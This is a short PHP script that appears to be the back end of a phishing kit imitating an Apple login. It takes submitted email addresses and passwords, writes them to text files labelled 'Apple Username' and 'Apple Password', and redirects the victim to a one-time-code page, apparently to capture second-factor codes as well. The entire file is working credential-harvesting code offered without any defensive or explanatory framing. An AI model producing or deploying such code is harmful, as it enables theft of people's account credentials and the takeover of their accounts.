<?php

file_put_contents("usernames.txt", "Apple Username :" . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Apple Password :" . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>